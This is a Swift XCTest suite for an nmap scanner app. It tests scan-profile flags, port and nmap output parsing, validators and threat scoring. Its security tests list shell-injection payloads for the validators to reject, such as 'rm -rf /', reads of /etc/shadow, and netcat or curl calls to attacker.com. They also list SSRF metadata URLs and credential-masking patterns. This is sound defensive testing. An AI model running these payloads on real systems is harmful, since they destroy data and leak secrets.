//
//  ComprehensiveTestSuite.swift
//  NMAPScannerTests
//
//  Comprehensive XCTest suite covering unit tests, security tests,
//  integration tests, functional tests, and frame tests for NMAPScanner.
//
//  Written by Jordan Koch on 2026-05-03.
//  Copyright © 2026 Jordan Koch. All rights reserved.
//

import XCTest
@testable import NMAPScanner

// MARK: - Unit Tests

final class NmapCommandBuildingTests: XCTestCase {

    // MARK: - Nmap Argument Assembly

    /// Verify quick scan builds a minimal, fast argument list
    func testQuickScanBuildsMinimalArguments() {
        let profile = AdvancedPortScanner.ScanProfile.quick
        let args = profile.nmapArgs
        // Quick should be exactly 2 flags: timing + fast mode
        XCTAssertEqual(args, ["-T4", "-F"])
    }

    /// Verify comprehensive scan includes both TCP and UDP flags
    func testComprehensiveScanIncludesTCPAndUDP() {
        let args = AdvancedPortScanner.ScanProfile.comprehensive.nmapArgs
        XCTAssertTrue(args.contains("-sS"), "Should include TCP SYN scan")
        XCTAssertTrue(args.contains("-sU"), "Should include UDP scan")
    }

    /// Verify stealth scan uses fragmentation for evasion
    func testStealthScanUsesFragmentation() {
        let args = AdvancedPortScanner.ScanProfile.stealth.nmapArgs
        XCTAssertTrue(args.contains("-f"), "Stealth should fragment packets")
        XCTAssertTrue(args.contains("-T2"), "Stealth should use polite timing")
    }

    /// Verify aggressive scan uses -A which combines OS, version, script, traceroute
    func testAggressiveScanUsesAFlag() {
        let args = AdvancedPortScanner.ScanProfile.aggressive.nmapArgs
        XCTAssertTrue(args.contains("-A"))
        // -A implies -O -sV -sC --traceroute, so no need for those individually
        XCTAssertFalse(args.contains("-O"), "-A already includes -O")
        XCTAssertFalse(args.contains("-sV"), "-A already includes -sV")
    }

    /// Verify no profile generates duplicate flags
    func testNoProfileHasDuplicateFlags() {
        for profile in AdvancedPortScanner.ScanProfile.allCases {
            let args = profile.nmapArgs
            let unique = Set(args)
            XCTAssertEqual(args.count, unique.count,
                "Profile \(profile.rawValue) should not have duplicate flags")
        }
    }

    /// Verify timing templates are within valid nmap range (T0-T5)
    func testTimingTemplatesAreValid() {
        let validTimings = ["-T0", "-T1", "-T2", "-T3", "-T4", "-T5"]
        for profile in AdvancedPortScanner.ScanProfile.allCases {
            for arg in profile.nmapArgs where arg.hasPrefix("-T") {
                XCTAssertTrue(validTimings.contains(arg),
                    "Profile \(profile.rawValue) has invalid timing template: \(arg)")
            }
        }
    }

    // MARK: - Port Range Parsing

    /// Verify standard ports generates exactly 1024 entries
    func testStandardPortsRangeIsCorrect() {
        let ports = PortScanConfiguration.standardPorts
        XCTAssertEqual(ports.count, 1024)
        XCTAssertEqual(ports.first, 1)
        XCTAssertEqual(ports.last, 1024)
        // Verify contiguous
        for i in 0..<ports.count {
            XCTAssertEqual(ports[i], i + 1)
        }
    }

    /// Verify all ports range covers the full TCP/UDP range
    func testAllPortsRangeIsCorrect() {
        let ports = PortScanConfiguration.allPorts
        XCTAssertEqual(ports.count, 65535)
        XCTAssertEqual(ports.first, 1)
        XCTAssertEqual(ports.last, 65535)
    }

    /// Verify service name lookup handles boundary ports
    func testServiceNameBoundaryPorts() {
        // Port 1 (lowest)
        XCTAssertEqual(PortScanConfiguration.serviceName(for: 1), "TCPMUX")
        // Port 65535 (highest valid) - unknown
        XCTAssertEqual(PortScanConfiguration.serviceName(for: 65535), "Port 65535")
        // Port 0 (invalid but shouldn't crash)
        XCTAssertEqual(PortScanConfiguration.serviceName(for: 0), "Port 0")
    }

    /// Verify risk level for every high-risk port
    func testRiskLevelComprehensiveHighRisk() {
        let highRisk = [21, 23, 25, 53, 80, 110, 143, 443, 445, 3389, 5900]
        for port in highRisk {
            XCTAssertEqual(PortScanConfiguration.riskLevel(for: port), .high,
                "Port \(port) must be classified as high risk")
        }
    }

    // MARK: - IP/Subnet Validation Edge Cases

    /// Verify IPv4 with leading zeros is accepted (no shell injection risk)
    func testIPWithLeadingZerosAccepted() {
        // Leading zeros are harmless in our validator - just checked as digits
        XCTAssertNoThrow(try IPValidator.validateIPAddress("01.02.03.04"))
    }

    /// Verify very long strings are rejected (not valid IP)
    func testVeryLongStringRejected() {
        let long = String(repeating: "1", count: 1000)
        XCTAssertThrowsError(try IPValidator.validateIPAddress(long))
    }

    /// Verify CIDR notation is NOT accepted by IP validator (it's for bare IPs)
    func testCIDRNotationRejectedByIPValidator() {
        XCTAssertThrowsError(try IPValidator.validateIPAddress("192.168.1.0/24"),
            "CIDR notation should be rejected - IP validator expects bare IPs")
    }

    /// Verify subnet with exactly 3 octets is valid
    func testSubnetThreeOctetsValid() {
        XCTAssertNoThrow(try IPValidator.validateSubnet("192.168.1"))
        XCTAssertNoThrow(try IPValidator.validateSubnet("10.0.0"))
    }

    /// Verify subnet with 4 octets is rejected
    func testSubnetFourOctetsRejected() {
        XCTAssertThrowsError(try IPValidator.validateSubnet("192.168.1.0"))
    }

    // MARK: - OSDetectionResult

    /// Verify OSDetectionResult default initialization
    func testOSDetectionResultDefaultInit() {
        let result = OSDetectionResult()
        XCTAssertNil(result.osName)
        XCTAssertNil(result.osFamily)
        XCTAssertEqual(result.accuracy, 0)
    }

    /// Verify OSDetectionResult with full initialization
    func testOSDetectionResultFullInit() {
        let result = OSDetectionResult(osName: "macOS 14 Sonoma", osFamily: "macOS", accuracy: 98)
        XCTAssertEqual(result.osName, "macOS 14 Sonoma")
        XCTAssertEqual(result.osFamily, "macOS")
        XCTAssertEqual(result.accuracy, 98)
    }

    // MARK: - NSEScriptResult Severity

    /// Verify all NSE severity levels have non-empty raw values
    func testNSESeverityRawValues() {
        XCTAssertEqual(NSEScriptResult.Severity.info.rawValue, "Info")
        XCTAssertEqual(NSEScriptResult.Severity.medium.rawValue, "Medium")
        XCTAssertEqual(NSEScriptResult.Severity.high.rawValue, "High")
    }

    // MARK: - AdvancedScanResult Properties

    /// Verify AdvancedScanResult initial state
    func testAdvancedScanResultInitialState() {
        let result = AdvancedScanResult(
            ipAddress: "10.0.0.1",
            hostname: "test.local",
            scanProfile: .comprehensive
        )
        XCTAssertEqual(result.ipAddress, "10.0.0.1")
        XCTAssertEqual(result.hostname, "test.local")
        XCTAssertTrue(result.tcpPorts.isEmpty)
        XCTAssertTrue(result.udpPorts.isEmpty)
        XCTAssertTrue(result.serviceVersions.isEmpty)
        XCTAssertTrue(result.scriptResults.isEmpty)
        XCTAssertNil(result.completionDate)
        XCTAssertNil(result.osDetection.osName)
    }

    /// Verify AdvancedScanResult hostname can be nil
    func testAdvancedScanResultNilHostname() {
        let result = AdvancedScanResult(
            ipAddress: "192.168.1.1",
            hostname: nil,
            scanProfile: .quick
        )
        XCTAssertNil(result.hostname)
    }
}

// MARK: - Security Tests

final class SecurityTests: XCTestCase {

    // MARK: - Shell Metacharacter Injection

    /// Verify semicolons in target IP are rejected (prevents command chaining)
    func testSemicolonInjectionInTargetRejected() {
        let payloads = [
            "192.168.1.1; rm -rf /",
            "10.0.0.1;id",
            ";echo pwned",
            "192.168.1.1 ; cat /etc/shadow",
        ]
        for payload in payloads {
            XCTAssertThrowsError(try IPValidator.validateIPAddress(payload),
                "Semicolon injection must be rejected: '\(payload)'")
        }
    }

    /// Verify pipe characters in target IP are rejected (prevents command piping)
    func testPipeInjectionInTargetRejected() {
        let payloads = [
            "192.168.1.1 | nc attacker.com 4444",
            "|/bin/sh",
            "10.0.0.1|cat /etc/passwd",
        ]
        for payload in payloads {
            XCTAssertThrowsError(try IPValidator.validateIPAddress(payload),
                "Pipe injection must be rejected: '\(payload)'")
        }
    }

    /// Verify backtick command substitution in target IP is rejected
    func testBacktickInjectionInTargetRejected() {
        let payloads = [
            "`whoami`",
            "192.168.`id`.1",
            "`rm -rf /tmp/*`",
        ]
        for payload in payloads {
            XCTAssertThrowsError(try IPValidator.validateIPAddress(payload),
                "Backtick injection must be rejected: '\(payload)'")
        }
    }

    /// Verify $() command substitution in target IP is rejected
    func testDollarParenInjectionInTargetRejected() {
        let payloads = [
            "$(whoami)",
            "192.168.$(id).1",
            "$(cat /etc/shadow)",
            "$((7*7))",
        ]
        for payload in payloads {
            XCTAssertThrowsError(try IPValidator.validateIPAddress(payload),
                "$() injection must be rejected: '\(payload)'")
        }
    }

    /// Verify && and || operator injection in target IP is rejected
    func testLogicalOperatorInjectionRejected() {
        let payloads = [
            "192.168.1.1 && rm -rf /",
            "10.0.0.1 || curl attacker.com/malware",
            "&& id",
        ]
        for payload in payloads {
            XCTAssertThrowsError(try IPValidator.validateIPAddress(payload),
                "Logical operator injection must be rejected: '\(payload)'")
        }
    }

    /// Verify redirect operators in target IP are rejected
    func testRedirectInjectionRejected() {
        let payloads = [
            "192.168.1.1 > /tmp/pwned",
            "10.0.0.1 >> /etc/crontab",
            "< /etc/passwd",
            "2>/dev/null",
        ]
        for payload in payloads {
            XCTAssertThrowsError(try IPValidator.validateIPAddress(payload),
                "Redirect injection must be rejected: '\(payload)'")
        }
    }

    /// Verify newline injection is rejected (could break command line)
    func testNewlineInjectionRejected() {
        let payloads = [
            "192.168.1.1\nwhoami",
            "10.0.0.1\r\nid",
            "192.168.1.1\rwhoami",
        ]
        for payload in payloads {
            XCTAssertThrowsError(try IPValidator.validateIPAddress(payload),
                "Newline injection must be rejected")
        }
    }

    /// Verify null byte injection is rejected (C-string truncation attack)
    func testNullByteInjectionRejected() {
        let payload = "192.168.1.1\0; rm -rf /"
        XCTAssertThrowsError(try IPValidator.validateIPAddress(payload),
            "Null byte injection must be rejected")
    }

    /// Verify nmap flag injection via target field is rejected
    func testNmapFlagInjectionViaTargetRejected() {
        // An attacker could try to inject nmap flags into the target field
        let payloads = [
            "-sV --script exploit",
            "--script=http-shellshock",
            "-oN /tmp/output 192.168.1.1",
            "-iL /etc/passwd",
            "--exclude 192.168.1.1",
        ]
        for payload in payloads {
            XCTAssertThrowsError(try IPValidator.validateIPAddress(payload),
                "Nmap flag injection must be rejected: '\(payload)'")
        }
    }

    /// Verify CIDR ranges in subnet validator reject shell metacharacters
    func testSubnetValidatorRejectsShellMetachars() {
        let payloads = [
            "192.168.1;id",
            "192.168.$(whoami)",
            "192.168.1|cat",
            "192.168.1`id`",
            "192.168.1 && rm",
            "192.168.1\nid",
        ]
        for payload in payloads {
            XCTAssertThrowsError(try IPValidator.validateSubnet(payload),
                "Shell metachar in subnet must be rejected: '\(payload)'")
        }
    }

    /// Verify URL validator blocks SSRF to cloud metadata endpoints
    func testSSRFBlockedForCloudMetadata() {
        let metadataEndpoints = [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/api/token",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://127.0.0.1:8080",
            "http://localhost/admin",
            "http://0.0.0.0:22",
        ]
        for endpoint in metadataEndpoints {
            XCTAssertThrowsError(try URLValidator.validateControllerURL(endpoint),
                "SSRF target must be blocked: \(endpoint)")
        }
    }

    // MARK: - No Hardcoded Credentials

    /// Verify nmap profile arguments contain no hardcoded passwords or tokens
    func testScanProfileArgsContainNoCredentials() {
        let credentialPatterns = ["password", "token", "secret", "key", "credential", "auth"]
        for profile in AdvancedPortScanner.ScanProfile.allCases {
            for arg in profile.nmapArgs {
                let lower = arg.lowercased()
                for pattern in credentialPatterns {
                    XCTAssertFalse(lower.contains(pattern),
                        "Profile \(profile.rawValue) arg '\(arg)' must not contain credential pattern '\(pattern)'")
                }
            }
        }
    }

    /// Verify nmap arguments contain no shell metacharacters
    func testAllProfileArgsAreShellSafe() {
        let shellMetachars: Set<Character> = [";", "|", "&", "`", "$", "(", ")", "{", "}", "<", ">", "\n", "\r", "\0"]
        for profile in AdvancedPortScanner.ScanProfile.allCases {
            for arg in profile.nmapArgs {
                for ch in arg {
                    XCTAssertFalse(shellMetachars.contains(ch),
                        "Profile \(profile.rawValue) arg '\(arg)' contains shell metachar '\(ch)'")
                }
            }
        }
    }

    /// Verify all nmap arguments start with a dash (are actual flags)
    func testAllProfileArgsAreFlags() {
        for profile in AdvancedPortScanner.ScanProfile.allCases {
            for arg in profile.nmapArgs {
                XCTAssertTrue(arg.hasPrefix("-"),
                    "Profile \(profile.rawValue) arg '\(arg)' must start with '-'")
            }
        }
    }

    // MARK: - Path Validation

    /// Verify nmap binary path validation - no path traversal
    func testNmapPathsAreAbsoluteAndSafe() {
        let validPaths = ["/usr/local/bin/nmap", "/opt/homebrew/bin/nmap"]
        for path in validPaths {
            XCTAssertTrue(path.hasPrefix("/"), "nmap path must be absolute")
            XCTAssertFalse(path.contains(".."), "nmap path must not contain path traversal")
            XCTAssertFalse(path.contains("~"), "nmap path must not use tilde expansion")
        }
    }

    // MARK: - User-Facing Errors Never Leak Internals

    /// Verify user-facing errors don't expose file paths or stack traces
    func testUserFacingErrorsNeverLeakPaths() {
        struct FakeInternalError: Error, LocalizedError {
            var errorDescription: String? = "Crash at /Volumes/Data/xcode/NMAPScanner/secret.swift:42 in processData()"
        }

        let message = UserFacingErrors.genericMessage(for: FakeInternalError())
        XCTAssertFalse(message.contains("/Volumes"), "Must not expose file paths")
        XCTAssertFalse(message.contains("secret.swift"), "Must not expose source files")
        XCTAssertFalse(message.contains("processData"), "Must not expose function names")
    }

    /// Verify URL validation errors are user-friendly
    func testURLValidationErrorsAreUserFriendly() {
        for errorCase in [URLValidationError.invalidURL, .unsupportedScheme, .blockedHost, .emptyInput] {
            let description = errorCase.localizedDescription
            XCTAssertFalse(description.isEmpty, "Error should have description")
            XCTAssertFalse(description.contains("URLValidationError"), "Should not expose error type name")
        }
    }

    /// Verify IP validation errors are user-friendly
    func testIPValidationErrorsAreUserFriendly() {
        for errorCase in [IPValidationError.invalidFormat, .privateAddressNotAllowed, .loopbackNotAllowed, .multicastNotAllowed, .emptyInput, .subnetTooLarge] {
            let description = errorCase.localizedDescription
            XCTAssertFalse(description.isEmpty, "Error should have description")
            XCTAssertFalse(description.contains("IPValidationError"), "Should not expose error type name")
        }
    }

    // MARK: - Secure Logger Masking

    /// Verify SecureLogger masking patterns cover common credential formats
    func testSecureLoggerMasksAllCredentialFormats() {
        // Test the regex patterns used by SecureLogger.maskSensitiveData
        let patterns: [(String, String)] = [
            (#""password"\s*:\s*"[^"]*""#, #"{"password": "SuperSecret123"}"#),
            (#""passwd"\s*:\s*"[^"]*""#, #"{"passwd": "test123"}"#),
            (#""token"\s*:\s*"[^"]*""#, #"{"token": "abc123def"}"#),
            (#""apikey"\s*:\s*"[^"]*""#, #"{"apikey": "sk-12345"}"#),
            (#""api_key"\s*:\s*"[^"]*""#, #"{"api_key": "AKIA12345"}"#),
            (#"unifises=[A-Za-z0-9]+"#, "Cookie: unifises=ABC123XYZ"),
            (#"Bearer\s+[A-Za-z0-9+/=]+"#, "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9"),
            (#"Basic\s+[A-Za-z0-9+/=]+"#, "Authorization: Basic dXNlcjpwYXNz"),
        ]

        for (pattern, input) in patterns {
            let regex = try! NSRegularExpression(pattern: pattern, options: [.caseInsensitive])
            let range = NSRange(input.startIndex..., in: input)
            XCTAssertGreaterThan(regex.numberOfMatches(in: input, range: range), 0,
                "SecureLogger pattern '\(pattern)' must match '\(input)'")
        }
    }
}

// MARK: - Integration Tests

final class IntegrationTestsComprehensive: XCTestCase {

    // MARK: - Nmap Binary

    /// Verify nmap is installed and executable
    func testNmapBinaryIsExecutable() {
        let possiblePaths = ["/opt/homebrew/bin/nmap", "/usr/local/bin/nmap"]
        var found = false
        for path in possiblePaths {
            let fm = FileManager.default
            if fm.fileExists(atPath: path) && fm.isExecutableFile(atPath: path) {
                found = true
                break
            }
        }
        XCTAssertTrue(found, "nmap must be installed and executable (brew install nmap)")
    }

    /// Verify arp command is available (used by ARP scanner)
    func testARPCommandAvailable() {
        XCTAssertTrue(FileManager.default.fileExists(atPath: "/usr/sbin/arp"),
            "arp must exist for ARP table scanning")
    }

    /// Verify ping command is available (used by ping sweep)
    func testPingCommandAvailable() {
        XCTAssertTrue(FileManager.default.fileExists(atPath: "/sbin/ping"),
            "ping must exist for ping sweep scanning")
    }

    // MARK: - Scan Results Directory

    /// Verify the Application Support directory is writable for scan persistence
    func testApplicationSupportDirectoryIsWritable() {
        let fm = FileManager.default
        let appSupport = fm.urls(for: .applicationSupportDirectory, in: .userDomainMask).first
        XCTAssertNotNil(appSupport, "Application Support directory must exist")
        if let dir = appSupport {
            XCTAssertTrue(fm.isWritableFile(atPath: dir.path),
                "Application Support directory must be writable for scan persistence")
        }
    }

    /// Verify temporary directory is writable for scan output files
    func testTemporaryDirectoryIsWritable() {
        let tempDir = NSTemporaryDirectory()
        XCTAssertTrue(FileManager.default.isWritableFile(atPath: tempDir),
            "Temporary directory must be writable for nmap XML output")
    }

    // MARK: - Settings Persistence

    /// Verify UserDefaults can store and retrieve port scan mode
    func testPortScanModeSettingsPersistence() {
        let defaults = UserDefaults.standard
        let original = defaults.selectedPortScanMode

        // Set to comprehensive
        defaults.selectedPortScanMode = .comprehensive
        XCTAssertEqual(defaults.selectedPortScanMode, .comprehensive)

        // Set to standard
        defaults.selectedPortScanMode = .standard
        XCTAssertEqual(defaults.selectedPortScanMode, .standard)

        // Restore original
        defaults.selectedPortScanMode = original
    }

    /// Verify custom scan presets can be encoded and decoded
    func testCustomPresetPersistenceRoundTrip() throws {
        let preset = ScanPreset(
            name: "Test Persistence",
            description: "Testing persistence",
            icon: "network",
            color: "blue",
            ports: [22, 80, 443, 8080],
            scanType: .targeted,
            timeout: 2.5,
            maxThreads: 50
        )

        let data = try JSONEncoder().encode(preset)
        let decoded = try JSONDecoder().decode(ScanPreset.self, from: data)

        XCTAssertEqual(decoded.name, preset.name)
        XCTAssertEqual(decoded.ports, preset.ports)
        XCTAssertEqual(decoded.scanType, preset.scanType)
        XCTAssertEqual(decoded.timeout, preset.timeout)
        XCTAssertEqual(decoded.maxThreads, preset.maxThreads)
    }

    // MARK: - Security Audit Log Persistence

    /// Verify audit log entries can be written and read back
    func testSecurityAuditLogPersistence() {
        // Clear existing entries for clean test
        let existingEntries = SecurityAuditLog.getRecentEntries(count: 1)
        _ = existingEntries // Just to verify we can read

        // Log a test event
        SecurityAuditLog.log(event: .scanStarted, details: "Integration test scan", level: .info)

        // Read back
        let entries = SecurityAuditLog.getRecentEntries(count: 100)
        let found = entries.contains { $0.details.contains("Integration test scan") }
        XCTAssertTrue(found, "Should be able to read back logged audit entry")
    }

    // MARK: - Model Serialization Integration

    /// Verify AISecurityWarning full round-trip with dates
    func testAISecurityWarningFullRoundTrip() throws {
        let warning = AISecurityWarning(
            severity: .critical,
            service: "Ollama",
            host: "192.168.1.100",
            port: 11434,
            title: "Unauthenticated API",
            description: "Ollama API accessible without auth",
            remediation: "Restrict to localhost",
            cveReferences: ["CVE-2024-1234"],
            probeResult: AIProbeResult(
                isVulnerable: true,
                responseReceived: true,
                authRequired: false,
                details: "API responded without credentials",
                probedAt: Date()
            )
        )

        let encoder = JSONEncoder()
        encoder.dateEncodingStrategy = .iso8601
        let data = try encoder.encode(warning)

        let decoder = JSONDecoder()
        decoder.dateDecodingStrategy = .iso8601
        let decoded = try decoder.decode(AISecurityWarning.self, from: data)

        XCTAssertEqual(decoded.severity, .critical)
        XCTAssertEqual(decoded.service, "Ollama")
        XCTAssertEqual(decoded.port, 11434)
        XCTAssertTrue(decoded.isVerified)
    }

    /// Verify ServiceBanner round-trip with all fields
    func testServiceBannerFullRoundTrip() throws {
        let banner = ServiceBanner(
            host: "192.168.1.1",
            port: 22,
            service: "SSH",
            banner: "OpenSSH_8.9p1 Ubuntu-3ubuntu0.4",
            detectedVersion: "8.9p1",
            serverSoftware: "OpenSSH",
            operatingSystem: "Ubuntu",
            confidence: 95,
            timestamp: Date(),
            vulnerabilityNotes: ["CVE-2023-12345"]
        )

        let encoder = JSONEncoder()
        encoder.dateEncodingStrategy = .iso8601
        let data = try encoder.encode(banner)

        let decoder = JSONDecoder()
        decoder.dateDecodingStrategy = .iso8601
        let decoded = try decoder.decode(ServiceBanner.self, from: data)

        XCTAssertEqual(decoded.host, "192.168.1.1")
        XCTAssertEqual(decoded.port, 22)
        XCTAssertEqual(decoded.confidence, 95)
        XCTAssertEqual(decoded.vulnerabilityNotes?.count, 1)
    }
}

// MARK: - Functional Tests

final class FunctionalTests: XCTestCase {

    // MARK: - Full Scan Configuration to Command Build Flow

    /// Verify scan profile selection produces correct nmap command arguments
    func testScanProfileToCommandFlow() {
        for profile in AdvancedPortScanner.ScanProfile.allCases {
            let args = profile.nmapArgs
            // Every non-custom profile must produce at least 1 argument
            if profile != .custom {
                XCTAssertFalse(args.isEmpty,
                    "Profile \(profile.rawValue) must produce nmap arguments")
            }
            // All arguments must be valid nmap flags (start with -)
            for arg in args {
                XCTAssertTrue(arg.hasPrefix("-"),
                    "Argument '\(arg)' from \(profile.rawValue) must be a valid nmap flag")
            }
        }
    }

    // MARK: - Export Results Flow

    /// Verify export produces report with all required sections
    @MainActor
    func testExportResultsContainsAllSections() {
        var result = AdvancedScanResult(
            ipAddress: "192.168.1.1",
            hostname: "gateway.local",
            scanProfile: .comprehensive
        )
        result.tcpPorts = [22, 80, 443, 8080]
        result.udpPorts = [53, 123, 161]
        result.osDetection = OSDetectionResult(osName: "Linux 5.15.0", osFamily: "Linux", accuracy: 92)
        result.serviceVersions = [22: "OpenSSH 8.9p1", 80: "nginx 1.24.0", 443: "nginx 1.24.0"]
        result.completionDate = Date()

        let report = AdvancedPortScanner.shared.exportResults(result)

        // Required sections
        XCTAssertTrue(report.contains("192.168.1.1"), "Report must contain IP")
        XCTAssertTrue(report.contains("gateway.local"), "Report must contain hostname")
        XCTAssertTrue(report.contains("Comprehensive Scan"), "Report must contain profile name")
        XCTAssertTrue(report.contains("TCP Ports"), "Report must contain TCP section")
        XCTAssertTrue(report.contains("UDP Ports"), "Report must contain UDP section")
        XCTAssertTrue(report.contains("OS Detection"), "Report must contain OS section")
        XCTAssertTrue(report.contains("Linux 5.15.0"), "Report must contain OS name")
        XCTAssertTrue(report.contains("Service Versions"), "Report must contain service section")
        XCTAssertTrue(report.contains("OpenSSH"), "Report must contain service details")
    }

    /// Verify export handles minimal results (no hostname, no OS, no services)
    @MainActor
    func testExportResultsMinimal() {
        let result = AdvancedScanResult(
            ipAddress: "10.0.0.1",
            hostname: nil,
            scanProfile: .quick
        )

        let report = AdvancedPortScanner.shared.exportResults(result)
        XCTAssertTrue(report.contains("10.0.0.1"))
        XCTAssertTrue(report.contains("Quick Scan"))
        XCTAssertFalse(report.contains("Hostname:"), "Nil hostname should not produce Hostname line")
    }

    // MARK: - Threat Analysis Flow

    /// Verify full threat analysis pipeline: devices -> threats -> summary
    @MainActor
    func testThreatAnalysisPipelineEndToEnd() {
        let analyzer = ThreatAnalyzer()

        let cleanDevice = EnhancedDevice(
            ipAddress: "192.168.1.10", macAddress: "AA:BB:CC:DD:EE:01",
            hostname: "secure-server", manufacturer: nil, deviceType: .server,
            openPorts: [PortInfo(port: 443, service: "https", version: nil, state: .open, protocolType: "TCP", banner: nil)],
            isOnline: true, firstSeen: Date().addingTimeInterval(-86400), lastSeen: Date(),
            isKnownDevice: true, operatingSystem: "Linux", deviceName: nil
        )

        let compromisedDevice = EnhancedDevice(
            ipAddress: "192.168.1.99", macAddress: "FF:EE:DD:CC:BB:AA",
            hostname: nil, manufacturer: nil, deviceType: .unknown,
            openPorts: [
                PortInfo(port: 31337, service: "unknown", version: nil, state: .open, protocolType: "TCP", banner: nil),
                PortInfo(port: 12345, service: "unknown", version: nil, state: .open, protocolType: "TCP", banner: nil),
            ],
            isOnline: true, firstSeen: Date().addingTimeInterval(-60), lastSeen: Date(),
            isKnownDevice: false, operatingSystem: nil, deviceName: nil
        )

        analyzer.analyzeNetwork(devices: [cleanDevice, compromisedDevice])

        // Verify summary
        XCTAssertNotNil(analyzer.networkSummary)
        XCTAssertEqual(analyzer.networkSummary?.totalDevices, 2)

        // Compromised device should have critical findings
        let compromisedSummary = analyzer.deviceSummaries.first { $0.device.ipAddress == "192.168.1.99" }
        XCTAssertNotNil(compromisedSummary)
        XCTAssertTrue(compromisedSummary?.hasThreats ?? false)
        XCTAssertFalse(compromisedSummary?.criticalThreats.isEmpty ?? true,
            "Device with backdoor ports must have critical threats")

        // Clean device should have minimal threats
        let cleanSummary = analyzer.deviceSummaries.first { $0.device.ipAddress == "192.168.1.10" }
        XCTAssertNotNil(cleanSummary)
    }

    /// Verify threat analysis handles empty device list gracefully
    @MainActor
    func testThreatAnalysisEmptyNetwork() {
        let analyzer = ThreatAnalyzer()
        analyzer.analyzeNetwork(devices: [])

        XCTAssertNotNil(analyzer.networkSummary)
        XCTAssertEqual(analyzer.networkSummary?.totalDevices, 0)
        XCTAssertEqual(analyzer.networkSummary?.totalThreats, 0)
        XCTAssertEqual(analyzer.networkSummary?.overallRiskScore, 100)
    }

    // MARK: - Scan Preset Application Flow

    /// Verify preset statistics calculation matches expected values
    @MainActor
    func testPresetStatisticsCalculation() {
        let manager = ScanPresetManager.shared
        let stats = manager.getPresetStatistics(.securityAudit)

        XCTAssertEqual(stats.portCount, 1024)
        XCTAssertEqual(stats.scanType, .comprehensive)
        XCTAssertEqual(stats.threadsUsed, 200)
        XCTAssertGreaterThan(stats.estimatedTimePerHost, 0)
        XCTAssertGreaterThan(stats.estimatedTimeFor254Hosts, stats.estimatedTimePerHost)
    }

    /// Verify quick scan preset has lowest estimated time
    @MainActor
    func testQuickScanPresetHasLowestTime() {
        let manager = ScanPresetManager.shared
        let quickStats = manager.getPresetStatistics(.quickScan)
        let auditStats = manager.getPresetStatistics(.securityAudit)

        XCTAssertLessThan(quickStats.estimatedTimePerHost, auditStats.estimatedTimePerHost,
            "Quick scan should have lower estimated time than security audit")
    }

    // MARK: - Device Discovery Parsing

    /// Verify ARP output parsing extracts valid IPs and rejects invalid ones
    func testARPOutputParsingEndToEnd() {
        let arpOutput = """
        ? (192.168.1.1) at aa:bb:cc:dd:ee:ff on en0 ifscope [ethernet]
        ? (192.168.1.33) at 11:22:33:44:55:66 on en0 ifscope [ethernet]
        ? (192.168.1.100) at (incomplete) on en0 ifscope [ethernet]
        ? (999.999.999.999) at ff:ff:ff:ff:ff:ff on en0
        """

        // Parse like the app does
        var ips: [String] = []
        let lines = arpOutput.split(separator: "\n")
        for line in lines {
            if let start = line.firstIndex(of: "("),
               let end = line.firstIndex(of: ")"),
               start < end {
                let ipStr = String(line[line.index(after: start)..<end])
                let parts = ipStr.split(separator: ".")
                if parts.count == 4 {
                    let allValid = parts.allSatisfy { if let n = Int($0) { return n >= 0 && n <= 255 } else { return false } }
                    if allValid { ips.append(ipStr) }
                }
            }
        }

        XCTAssertEqual(ips.count, 3, "Should find 3 valid IPs (999.999 rejected)")
        XCTAssertTrue(ips.contains("192.168.1.1"))
        XCTAssertTrue(ips.contains("192.168.1.33"))
        XCTAssertTrue(ips.contains("192.168.1.100"))
        XCTAssertFalse(ips.contains("999.999.999.999"))
    }

    // MARK: - Nmap Port Output Parsing

    /// Verify nmap text output parsing extracts only open ports
    func testNmapPortParsingEndToEnd() {
        let nmapOutput = """
        Starting Nmap 7.94 ( https://nmap.org )
        Nmap scan report for 192.168.1.1
        Host is up (0.003s latency).

        PORT      STATE    SERVICE
        22/tcp    open     ssh
        80/tcp    open     http
        443/tcp   open     https
        3306/tcp  closed   mysql
        8080/tcp  filtered http-proxy
        32400/tcp open     plex

        Nmap done: 1 IP address (1 host up) scanned in 1.23 seconds
        """

        var ports: [Int] = []
        let lines = nmapOutput.components(separatedBy: "\n")
        for line in lines {
            let components = line.components(separatedBy: .whitespaces).filter { !$0.isEmpty }
            if components.count >= 2 && components[0].contains("/") && components[1] == "open" {
                if let port = Int(components[0].components(separatedBy: "/")[0]) {
                    ports.append(port)
                }
            }
        }

        XCTAssertEqual(ports.count, 4, "Should find 4 open ports")
        XCTAssertTrue(ports.contains(22))
        XCTAssertTrue(ports.contains(80))
        XCTAssertTrue(ports.contains(443))
        XCTAssertTrue(ports.contains(32400))
        XCTAssertFalse(ports.contains(3306), "Closed port should not be included")
        XCTAssertFalse(ports.contains(8080), "Filtered port should not be included")
    }

    // MARK: - Risk Score Computation

    /// Verify risk score boundaries match expected risk levels
    func testRiskScoreBoundaries() {
        // No threats = 100 = Low Risk
        let clean = NetworkThreatSummary(
            scanDate: Date(), totalDevices: 10, threatenedDevices: 0,
            criticalThreats: [], highThreats: [], mediumThreats: [], lowThreats: [],
            rogueDevices: [], backdoorDevices: [], exposedServices: []
        )
        XCTAssertEqual(clean.overallRiskScore, 100)
        XCTAssertEqual(clean.riskLevel, "Low Risk")

        // Many criticals = Critical Risk
        let finding = ThreatFinding(
            severity: .critical, category: .backdoor, title: "Test",
            description: "", affectedHost: "test", affectedPort: nil,
            detectedAt: Date(), cvssScore: 10.0, cveReferences: [],
            remediation: "", technicalDetails: "", impactAssessment: ""
        )
        let critical = NetworkThreatSummary(
            scanDate: Date(), totalDevices: 1, threatenedDevices: 1,
            criticalThreats: Array(repeating: finding, count: 100),
            highThreats: [], mediumThreats: [], lowThreats: [],
            rogueDevices: [], backdoorDevices: [], exposedServices: []
        )
        XCTAssertLessThan(critical.overallRiskScore, 40)
        XCTAssertEqual(critical.riskLevel, "Critical Risk")
    }

    /// Verify risk score never goes below zero
    func testRiskScoreNeverNegative() {
        let finding = ThreatFinding(
            severity: .critical, category: .backdoor, title: "Test",
            description: "", affectedHost: "test", affectedPort: nil,
            detectedAt: Date(), cvssScore: 10.0, cveReferences: [],
            remediation: "", technicalDetails: "", impactAssessment: ""
        )
        let extreme = NetworkThreatSummary(
            scanDate: Date(), totalDevices: 1, threatenedDevices: 1,
            criticalThreats: Array(repeating: finding, count: 10000),
            highThreats: [], mediumThreats: [], lowThreats: [],
            rogueDevices: [], backdoorDevices: [], exposedServices: []
        )
